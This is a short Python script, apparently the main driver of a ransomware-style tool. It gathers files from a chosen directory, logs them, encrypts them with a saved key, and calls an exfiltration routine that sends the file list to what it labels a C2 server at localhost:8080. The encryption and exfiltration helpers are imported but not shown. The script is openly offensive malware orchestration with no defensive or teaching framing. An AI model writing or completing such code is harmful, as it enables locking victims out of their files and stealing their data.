import os
from test import collect_files  # File Collection
from encryption import encrypt_files, save_key  # Encryption
from exfil import run_exfiltration  # Exfiltration

def main():
    target_dir = input("📁 Enter the directory to search: ").strip()
    
    # Step 1: Collect Files
    print("[*] Collecting target files...")
    files = collect_files(target_dir)

    if not files:
        print("[-] No matching files found.")
        return

    with open("files.log", "w") as log:
        for file in files:
            log.write(file + "\n")
    
    # Step 2: Encrypt Files
    print("[*] Encrypting files...")
    key = encrypt_files(files)
    save_key(key, "key.bin")

    # Step 3: Exfiltrate Files
    print("[*] Exfiltrating files to C2 server...")
    run_exfiltration("files.log", "http://localhost:8080")

    print("[✓] All steps completed.")

if __name__ == "__main__":
    main()
